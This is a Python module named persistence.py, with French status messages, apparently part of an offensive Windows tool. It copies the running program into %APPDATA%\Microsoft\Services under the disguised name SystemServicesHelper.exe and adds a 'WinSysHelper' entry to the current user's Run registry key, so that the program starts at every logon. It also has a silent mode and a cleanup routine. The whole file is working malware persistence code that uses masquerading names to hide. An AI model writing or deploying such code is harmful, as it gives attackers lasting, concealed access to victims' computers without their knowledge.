# modules/persistence.py

import os
import shutil
import sys
import winreg
from datetime import datetime

def get_target_path(custom_name="SystemServicesHelper.exe"):
    appdata = os.getenv("APPDATA")
    hidden_dir = os.path.join(appdata, "Microsoft", "Services")
    os.makedirs(hidden_dir, exist_ok=True)
    return os.path.join(hidden_dir, custom_name)

def is_already_persisted(reg_key_name="WinSysHelper"):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_READ)
        _, val, _ = winreg.QueryValueEx(key, reg_key_name)
        winreg.CloseKey(key)
        return os.path.exists(val)
    except FileNotFoundError:
        return False
    except:
        return False

def add_to_startup(script_path=None, reg_key_name="WinSysHelper", silent=False):
    try:
        if script_path is None:
            script_path = sys.argv[0]

        target_path = get_target_path()
        if not os.path.exists(target_path):
            shutil.copy(script_path, target_path)

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, reg_key_name, 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)

        if not silent:
            print(f"[+] Persistance ajoutée avec succès.")
            print(f"    → Copie : {target_path}")
            print(f"    → Registre : {reg_key_name}")
        return True

    except Exception as e:
        if not silent:
            print(f"[!] Erreur persistance : {e}")
        return False

def run(silent=False):
    print("[*] Vérification de la persistance...")
    if is_already_persisted():
        if not silent:
            print("[✔] Persistance déjà en place.")
        return
    print("[*] Mise en place de la persistance...")
    success = add_to_startup(silent=silent)
    if success and not silent:
        print(f"[{datetime.now()}] [✓] Persistance active.")
    elif not success and not silent:
        print("[!] Échec de la persistance.")

def clean():
    print("[*] Suppression de la persistance...")

    reg_key_name = "WinSysHelper"
    try:
        # 🔧 Suppression de la clé registre
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, reg_key_name)
        winreg.CloseKey(key)
        print("[+] Clé registre supprimée.")
    except FileNotFoundError:
        print("[!] Clé registre non trouvée.")
    except Exception as e:
        print(f"[!] Erreur suppression registre : {e}")

    # 🧹 Suppression du fichier copié
    copied_path = get_target_path()
    try:
        if os.path.exists(copied_path):
            os.remove(copied_path)
            print(f"[+] Fichier supprimé : {copied_path}")
        else:
            print("[!] Fichier non trouvé.")
    except Exception as e:
        print(f"[!] Erreur suppression fichier : {e}")
